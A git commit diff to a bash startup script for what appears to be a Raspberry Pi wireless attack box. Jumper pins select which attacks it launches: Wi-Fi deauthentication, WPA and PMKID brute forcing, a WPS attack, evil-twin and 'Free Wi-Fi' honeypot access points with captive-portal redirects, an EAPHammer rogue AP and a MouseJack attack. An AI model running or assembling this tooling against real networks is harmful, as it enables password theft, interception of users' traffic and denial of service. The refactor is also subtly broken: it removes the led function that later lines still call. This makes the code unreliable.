3bcbeab45b2cc613f2ee619d5f8712aff3c49988
soupbone89 <217927327+soupbone89@users.noreply.github.com>
2026-01-13 15:20:20 +0200

    Refactor LED control and update attack commands
    Refactor LED control and monitor_enable function. Update screen commands for various attack modes.

--- startup.sh
+++ startup.sh
@@ -1,27 +1,11 @@
 #!/usr/bin/env bash
 # Define LED control function (assuming pins: green=7, yellow=10, red=11)
 
-# Adjust pins if needed
-led() {
-    case "$1" in
-        green) pin=7 ;;
-        yellow) pin=10 ;;
-        red) pin=11 ;;
-        *) echo "Invalid LED color: $1" >&2; return 1 ;;
-    esac
-    case "$2" in
-        on) level=dh ;;
-        off) level=dl ;;
-        *) echo "Invalid LED state: $2" >&2; return 1 ;;
-    esac
-    raspi-gpio set $pin op $level
-}
-function monitor_enable() {
+function monitor_enable(){
     iw phy0 interface add mon0 type monitor
-    ip link set mon0 up
-    iwconfig wlan0 up
+    ifconfig mon0 up
+    ifconfig wlan0 up
 }
-
 
 # Set pull-ups for jumper pins
 raspi-gpio set 7 ip pu
@@ -46,47 +30,56 @@ led red off 2>/dev/null
 if jmp 7; then
     echo "[*] wpa auth/deauth/online_brute attack (static/dynamic)"
     monitor_enable
-    cd /home/pi/wpapsk || exit 1
-    screen -dmS wpapsk -L -logfile "$time-wpapsk.log" ./
-    #monitor.sh -c 1,6,11 -t deauth -X screen ./deauth.sh -b target.txt
-    screen -S wpapsk -X screen -t deauth ./deauth.sh -c 1,6,11
-    screen -S wpapsk -X screen -t brute ./brute-wpapsk.sh
-    screen -S wpapsk -X screen -t auth ./auth.sh
-    screen -S wpapsk -X screen -t brute-pmkid ./brute-pmkid.sh
-    screen -S wpapsk -X screen -t online_brute ./online-brute.sh wpa-brute-width.sh "Target" 12345678 123456789 1234567890
+    cd wpapsk
+    screen -dmS wpapsk -t monitor -L -Logfile "$time-wpapsk-%n.log" ./
+    monitor.sh -c 1,6,11
+    #screen -r wpapsk -t deauth -X screen ./deauth.sh -b target.txt
+    screen -r wpapsk -t brute-wpapsk -X screen ./brute-wpapsk.sh
+    screen -r wpapsk -t auth -X screen ./auth.sh
+    screen -r wpapsk -t brute-pmkid -X screen ./brute-pmkid.sh
+    screen -r wpapsk -t online_brute -X screen ./wpa_brute.sh "Target Wi-Fi" passwords.txt 4
+    #screen -r wpapsk -t online_brute -X screen './wpa_brute-width.sh 12345678 123456789 1234567890 password'
+    cd -
+
 elif jmp 11; then
     echo "[*] wps attack (static/dynamic)"
-    monitor_enable
-    cd /home/pi/wps || exit 1
-    screen -dmS wps -L -logfile "$time-wps.log" ./.wps.sh "Target Wi-Fi"
+    cd wpapsk
+    screen -dmS wpapsk -t wps -L -Logfile "$time-wps-%n.log" ./wps.sh "Target Wi-Fi"
+    cd -
+
 elif jmp 10; then
+    echo "[*] roqueap/eviltwin attack (static)"
     #monitor_enable
-    echo "[*] enable/evil twin attack (static)"
+    cd eviltwin
     ifconfig wlan0 10.0.0.1/24
     iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j REDIRECT --to-ports 80
-    cd /home/pi/evilwin || exit 1
-    screen -dmS hostapd -L -logfile "$time-evilwin.log" ./hostapd.sh
-    screen -S captive -X screen -t captive ./captive.sh www
-    screen -S evilwin -X screen -t dnsmasq ./dnsmasq.sh
-    screen -S evilwin -X screen -t deauth ./deauth.sh -c 1,6,11
+    screen -dmS eviltwin -t hostapd -L -Logfile "$time-eviltwin-%n.log" ./hostapd.sh "Corp Wi-Fi" ""
+    screen -r eviltwin -t dnsmasq -X screen ./dnsmasq.sh
+    screen -r eviltwin -t captive -X screen ./captive.sh www/
+    #screen -r eviltwin -t deauth -X screen ./deauth.sh -c 1,6,11
+    cd -
+
 elif jmp 23; then
-    echo "[*] honeypot (static)"
-    cd /home/pi/honeypot || exit 1
-    screen -dmS honeypot -L -logfile "$time-honeypot.log" ./hostapd.sh
-    screen -S honeypot -X screen -t dnsmasq ./dnsmasq.sh "Free WiFi"
-    screen -S honeypot -X screen -t attack ./attack.sh
+    echo "[*] roqueap/honeypot (static)"
+    cd honeypot
+    ifconfig wlan0 10.0.0.1/24
+    screen -dmS honeypot -t hostapd -L -Logfile "$time-honeypot-%n.log" ./hostapd.sh "Free Wi-Fi" ""
+    screen -r honeypot -t dnsmasq -X screen ./dnsmasq.sh
+    screen -r honeypot -t attack -X screen ./attack.sh
     cd -
-elif jmp 25; then
-    echo "[*] roqueap/eap (static)"
-    cd /home/pi/eap || exit 1
-    screen -dmS eap -t hostapd-eaphammer -L -logfile "$time-eap-%n.log" ./hostapd-eaphammer.sh "Target Wi-Fi"
-    #screen -r eap -t deauth -X screen ./deauth.sh -c 1,6,11
-    cd -
+
 elif lsusb | grep -q 'Nordic Semiconductor'; then
     echo "[*] mousejack attack"
     cd /home/pi/mousejack || exit 1
     screen -dmS mousejack -t jackit -L -logfile "$time-mousejack-%n.log" './mousejack.sh'
     cd -
+
+elif jmp 25; then
+    echo "[*] roqueap/eap (static)"
+    cd eap
+    screen -dmS eap -t hostapd-eaphammer -L -Logfile "$time-eap-%n.log" ./hostapd-eaphammer.sh "Target Wi-Fi"
+    #screen -r eap -t deauth -X screen ./deauth.sh -c 1,6,11
+
 elif jmp 27; then
     echo "[*] wi-fi recon (dynamic)"
     monitor_enable
